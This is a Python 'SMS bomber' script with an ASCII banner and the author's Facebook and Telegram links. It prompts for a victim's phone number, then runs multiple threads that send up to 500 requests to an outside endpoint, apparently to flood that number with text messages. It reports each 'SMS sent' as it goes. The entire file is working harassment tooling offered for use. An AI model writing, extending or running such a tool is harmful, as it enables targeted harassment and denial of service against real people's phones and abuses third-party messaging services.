#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# Banner and Owner Info
BANNER = r"""
░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
"""

OWNER_INFO = """
==============================
        Tools Owner Info
==============================
[📘] Facebook Page : https://www.facebook.com/profile.php?id=61564222827738
[📢] Telegram Channel: https://t.me/ERR0R_V4U_Your_Love
"""

RESET_SCREEN = "cls" if os.name == "nt" else "clear"

def clr():
    os.system(RESET_SCREEN)

def banner():
    clr()
    print(BANNER)
    print(OWNER_INFO)
    print("\n")

def format_phone(num):
    # Keep only digits
    return ''.join(filter(str.isdigit, num.strip()))

def input_phone():
    while True:
        cc = input("Enter country code (without +): ").strip()
        cc = format_phone(cc)
        if len(cc) < 1 or not cc.isdigit():
            print("[!] Invalid country code, try again.")
            continue

        target = input(f"Enter target phone number (without country code): ").strip()
        target = format_phone(target)
        if len(target) < 6 or len(target) > 15:
            print("[!] Invalid target phone number length, try again.")
            continue

        return cc, target

def input_int(prompt, max_value=None):
    while True:
        try:
            val = int(input(prompt).strip())
            if val <= 0:
                print("[!] Number must be positive.")
                continue
            if max_value and val > max_value:
                print(f"[!] Maximum allowed is {max_value}, setting to max.")
                val = max_value
            return val
        except ValueError:
            print("[!] Invalid input, please enter a valid number.")

def input_float(prompt):
    while True:
        try:
            val = float(input(prompt).strip())
            if val < 0:
                print("[!] Number must not be negative.")
                continue
            return val
        except ValueError:
            print("[!] Invalid input, please enter a valid number.")

def start_bombing(cc, target, count, delay, threads):
    url = f"https://alnayeem.top/Vip-Bomber.php?phone={cc}{target}"
    success, failed = 0, 0
    lock = threading.Lock()

    banner()
    print(f"Starting bombing +{cc} {target}")
    print(f"Total SMS to send: {count}")
    print(f"Delay between requests: {delay} seconds")
    print(f"Using {threads} threads")
    print("\nPress CTRL+C to stop.\n")

    def send_request():
        nonlocal success, failed
        try:
            response = requests.get(url, timeout=10)
            with lock:
                if response.status_code == 200:
                    success += 1
                    print(f"[+] SMS sent successfully! ({success} successful, {failed} failed)")
                else:
                    failed += 1
                    print(f"[-] Failed to send SMS! HTTP Status: {response.status_code} ({success} successful, {failed} failed)")
        except Exception as e:
            with lock:
                failed += 1
                print(f"[-] Request error: {e} ({success} successful, {failed} failed)")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in tqdm(range(count), desc="Sending SMS"):
            futures.append(executor.submit(send_request))
            time.sleep(delay)  # spacing out requests as user requested

        # Wait for all to complete
        for future in as_completed(futures):
            pass

    print("\nBombing complete!")
    print(f"Total Successful: {success}")
    print(f"Total Failed: {failed}")

def main():
    banner()
    cc, target = input_phone()
    count = input_int("Enter number of SMS to send (max 500): ", max_value=500)
    delay = input_float("Enter delay between requests (seconds, e.g. 0.5): ")
    max_threads = (count // 10) if (count // 10) > 0 else 1
    threads = input_int(f"Enter number of threads (recommended {max_threads}): ", max_value=50)

    try:
        start_bombing(cc, target, count, delay, threads)
    except KeyboardInterrupt:
        print("\n[!] Bombing stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
